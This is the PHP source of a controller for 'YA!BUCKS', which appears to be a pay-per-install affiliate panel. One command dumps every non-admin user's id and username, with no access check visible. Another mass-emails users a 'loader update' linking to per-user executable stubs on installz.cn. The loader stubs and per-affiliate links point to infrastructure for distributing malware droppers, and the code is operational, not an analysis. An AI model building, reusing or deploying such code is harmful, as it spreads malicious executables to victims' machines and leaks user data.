<?php
//---------------------- required -------------
require_once '../controller/boot.php';
require_once '../controller/Public.php';

//---------------------- libs -----------------
require_once '../lib/Mail/class.phpmailer.php';
//---------------------- models ---------------
require_once '../model/Users.php';

class Controller extends PublicController {
    private $UsersModel;
    
    public function __construct(Config $config) {
        parent::__construct($config);
        $this->UsersModel = new UsersModel($this->getDatabaseAdapter());
    }
    
    public function init(Config $config) {
        parent::init($config);
    }    
    
    public function indexCmd() {
        return $this->_404($this->getCommand());
    }

    public function uidsCmd() {
        $where = ' `is_admin` = 0';
        $users = $this->UsersModel->getUsers(0, $this->UsersModel->getUsersCnt($where), $where);         
        $resp  = '';
        for ($i = 0, $count = count($users); $i < $count; $i++) {
            $resp .= $users[$i]['uid'].'|'.$users[$i]['username']."\n";
        }   
        $resp = rtrim($resp);
        die($resp);
    }
    
    public function doUpdatedMailCmd() {
        $where = ' `is_admin` = 0';
        $users = $this->UsersModel->getUsers(0, $this->UsersModel->getUsersCnt($where), $where); 

        $PHPMailer = new PHPMailer();
        $PHPMailer->ContentType = 'text/html';
    	$PHPMailer->CharSet  = 'utf-8';           
	    $PHPMailer->From     = 'no-reply@yabucks.com';      
	    $PHPMailer->FromName = 'YA!BUCKS';
	    $PHPMailer->Subject  = 'YA!BUCKS - loader update'; 
        
        for ($i = 0, $count = count($users); $i < $count; $i++) {	
            $this->getTemplateAdapter()->put('loader', 
            'http://installz.cn/stubfiles/'.substr($users[$i]['uid'], 0, 5).'.exe');                
            $this->getTemplateAdapter()->pass($users[$i]);            	    
            $PHPMailer->Body = $this->getTemplateAdapter()->render('emails/update.tpl.php'); 
            $PHPMailer->AddAddress($users[$i]['email']);
            $PHPMailer->Send();            	  
            $PHPMailer->ClearAddresses();
        }
        die();
    }
}

//---------------------- required -------------
require_once '../controller/dispatcher/default.php';
?>